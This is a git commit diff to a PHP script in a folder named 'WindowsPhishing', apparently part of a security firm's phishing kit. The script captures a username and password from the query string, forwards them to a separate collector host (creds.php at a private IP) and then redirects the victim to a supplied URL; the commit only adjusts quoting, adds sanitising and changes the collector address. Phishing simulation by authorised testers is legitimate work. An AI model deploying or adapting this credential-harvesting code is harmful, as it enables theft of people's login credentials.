f77215e03f5a55552f2827abcd74ab60337df458
Lighthouse IT Security <84382227+lighthouseitsecurity@users.noreply.github.com>
2025-04-26 18:17:39 +0200

    updated

--- WindowsPhishing/redir.php
+++ WindowsPhishing/redir.php
@@ -1,14 +1,14 @@
 <?php
-if(isset($_GET["user"]) and isset($_GET["pass"])) {
-    $user = $_GET["user"];
-    $pass = $_GET["pass"];
-    $url = 'http://192.168.5.15:80/creds.php?user=' . $user . '&pass=' . $pass;
+if(isset($_GET['user']) and isset($_GET['pass'])) {
+    $user = htmlspecialchars(strip_tags($_GET['user']));
+    $pass = htmlspecialchars(strip_tags($_GET['pass']));
+    $url = 'http://192.168.5.5:80/creds.php?user=' . $user . '&pass=' . $pass;
     file_get_contents($url);
 }
-if(isset($_GET["redir"])) {
-    $redir = $_GET["redir"];
+if(isset($_GET['redir'])) {
+    $redir = htmlspecialchars(strip_tags($_GET['redir']));
     if(filter_var($redir, FILTER_VALIDATE_URL)) {
-        echo "<meta http-equiv='Refresh' content='0; url=" . $redir . "' />";
+        echo '<meta http-equiv="Refresh" content="0; url=' . $redir . '" />';
     }
 }
 ?>
